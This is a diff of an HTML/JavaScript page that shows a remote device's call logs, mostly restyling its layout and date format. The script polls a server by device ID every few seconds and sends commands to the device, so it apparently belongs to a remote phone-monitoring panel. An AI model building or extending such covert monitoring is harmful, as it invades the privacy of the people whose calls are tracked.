@@ -22,21 +22,38 @@
             background-image: linear-gradient(135deg, #000000 0%, #1c1c1e 100%);
             color: var(--text-main);
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            margin: 0; padding: 10px; /* Reduced padding for mobile feel */
-            display: flex; justify-content: center;
+            margin: 0; 
+            padding: 0;
+            height: 100vh; /* Full viewport height */
+            width: 100vw;
+            display: flex; 
+            justify-content: center;
+            align-items: center; /* Center vertically */
+            overflow: hidden; /* Prevent body scroll */
         }
 
+        /* --- UPDATED CONTAINER (SMS STYLE) --- */
         .container {
-            width: 100%; max-width: 480px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 30px; padding: 20px;
-            min-height: 90vh;
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
+            width: 90%; 
+            max-width: 420px; /* Slightly tighter width for SMS feel */
+            background: rgba(20, 20, 20, 0.6); /* Slightly darker for contrast */
+            border-radius: 25px; 
+            padding: 20px;
+            
+            /* Key change: Height is dynamic but capped */
+            height: auto;
+            max-height: 85vh; /* Leaves space at top and bottom */
+            display: flex;
+            flex-direction: column; /* Stacks header and list */
+            
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
             position: relative;
         }
 
-        /* --- HEADER UPDATED (Centered Title) --- */
+        /* Header fixed at top of container */
         .header {
             display: flex; 
             justify-content: space-between; 
@@ -44,7 +61,8 @@
             margin-bottom: 15px; 
             padding-bottom: 15px;
             border-bottom: 0.5px solid var(--glass-border);
-            position: relative; /* For absolute centering of title */
+            flex-shrink: 0; /* Prevents header from shrinking */
+            position: relative;
         }
 
         .header-left { 
@@ -65,7 +83,7 @@
             position: absolute;
             left: 50%;
             transform: translateX(-50%);
-            font-size: 1.2rem; 
+            font-size: 1.1rem; 
             font-weight: 600; 
             letter-spacing: 0.5px;
             color: var(--text-main);
@@ -99,24 +117,33 @@
             padding: 0;
         }
 
+        /* --- UPDATED LIST (Scrolls INSIDE container) --- */
         .log-list { 
-            display: flex; flex-direction: column; gap: 0px; 
-            max-height: 75vh; overflow-y: auto; 
+            display: flex; 
+            flex-direction: column; 
+            gap: 0px; 
+            overflow-y: auto; /* Scroll enabled here */
+            flex-grow: 1; /* Takes remaining space */
+            
+            /* Hide scrollbar for clean look */
+            -ms-overflow-style: none;  /* IE and Edge */
+            scrollbar-width: none;  /* Firefox */
         }
         
-        .log-list::-webkit-scrollbar { width: 0px; background: transparent; }
+        .log-list::-webkit-scrollbar { display: none; }
 
         .log-card {
             padding: 12px 5px;
             display: flex; align-items: center;
-            border-bottom: 0.5px solid rgba(255,255,255,0.1);
+            border-bottom: 0.5px solid rgba(255,255,255,0.08);
             transition: 0.2s;
         }
         
-        .log-card:active { background: rgba(255,255,255,0.1); }
+        .log-card:last-child { border-bottom: none; }
+        .log-card:active { background: rgba(255,255,255,0.05); border-radius: 10px; }
 
         .log-icon {
-            font-size: 0.9rem; margin-right: 15px; width: 30px; height: 30px;
+            font-size: 0.9rem; margin-right: 15px; width: 32px; height: 32px;
             display: flex; align-items: center; justify-content: center;
             flex-shrink: 0;
             border-radius: 50%;
@@ -130,7 +157,7 @@
         .log-info { flex: 1; overflow: hidden; display: flex; flex-direction: column; justify-content: center; }
         
         .log-name { 
-            font-size: 1.05rem; font-weight: 600; 
+            font-size: 1rem; font-weight: 600; 
             white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
             color: var(--text-main);
             display: flex; align-items: center; gap: 6px;
@@ -138,27 +165,26 @@
         
         .log-name.is-missed { color: var(--missed); }
 
-        .name-icon { font-size: 0.8rem; opacity: 0.7; }
+        .name-icon { font-size: 0.75rem; opacity: 0.7; }
 
         .log-details-row {
             display: flex; align-items: center; gap: 6px;
-            font-size: 0.8rem; color: var(--text-sub); margin-top: 3px;
+            font-size: 0.75rem; color: var(--text-sub); margin-top: 3px;
         }
 
         .call-action {
             width: 35px; height: 35px;
             display: flex; align-items: center; justify-content: center;
             color: var(--outgoing);
-            font-size: 1.1rem;
+            font-size: 1rem;
             text-decoration: none;
             margin-left: 10px;
-            background: rgba(255,255,255,0.05);
+            background: rgba(255,255,255,0.08);
             border-radius: 50%;
         }
 
         .status-msg { text-align: center; color: var(--text-sub); margin-top: 50px; }
-        
-        .debug-info { font-size: 10px; color: #555; text-align: center; margin-top: 5px; display: none; }
+        .debug-info { display: none; }
     </style>
 </head>
 <body>
@@ -181,8 +207,9 @@
         </div>
 
         <div class="debug-info" id="debugBox"></div>
+        
         <div class="log-list" id="logsContainer">
-        </div>
+            </div>
     </div>
 
     <script>
@@ -200,19 +227,14 @@
                 return;
             }
             
-            detectContactsData(); // Your existing contact logic
+            detectContactsData();
             loadFromStorage();
-            
-            // First fast command send
             sendCommand();
-            
-            // Start Loop
             startLiveUpdates();
         });
 
         function startLiveUpdates() {
-            fetchLogs(); // Immediate fetch
-            // Update every 3 seconds
+            fetchLogs();
             refreshInterval = setInterval(() => {
                 fetchLogs();
             }, 3000);
@@ -223,7 +245,7 @@
             fetchLogs();
         }
 
-        // --- 1. SUPER CONTACT DETECTOR (SAME AS BEFORE) ---
+        // --- 1. SUPER CONTACT DETECTOR ---
         function detectContactsData() {
             try {
                 for (let i = 0; i < localStorage.length; i++) {
@@ -260,10 +282,8 @@
         function getValidDate(log) {
             let raw = log.date || log.timestamp || log.time || log.created_at;
             if (!raw) return null;
-
             let dateObj = new Date(raw);
             if (!isNaN(dateObj.getTime())) return dateObj;
-
             let num = Number(raw);
             if (!isNaN(num)) {
                 if (num < 1000000000000) num *= 1000;
@@ -272,7 +292,7 @@
             return null;
         }
 
-        // --- UPDATED: 12-HOUR FORMAT LOGIC ---
+        // --- UPDATED: 12-HOUR FORMAT ---
         function formatSmartDate(dateObj) {
             if (!dateObj) return "Unknown Date";
 
@@ -280,7 +300,6 @@
             const yesterday = new Date(now);
             yesterday.setDate(yesterday.getDate() - 1);
 
-            // CHANGED: Added 'hour12: true' and 'en-US'
             const timeStr = dateObj.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true });
 
             if (dateObj.toDateString() === now.toDateString()) {
@@ -316,9 +335,7 @@
             fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${timestamp}`)
                 .then(response => response.json())
                 .then(data => {
-                    const timeNow = new Date().toLocaleTimeString('en-US', {hour: 'numeric', minute:'2-digit', hour12: true});
                     document.getElementById("liveText").innerText = `LIVE`;
-
                     if (data && Array.isArray(data) && data.length > 0) {
                         localStorage.setItem(storageKey, JSON.stringify(data));
                         detectContactsData();
@@ -393,4 +410,3 @@
     </script>
 </body>
 </html>
-
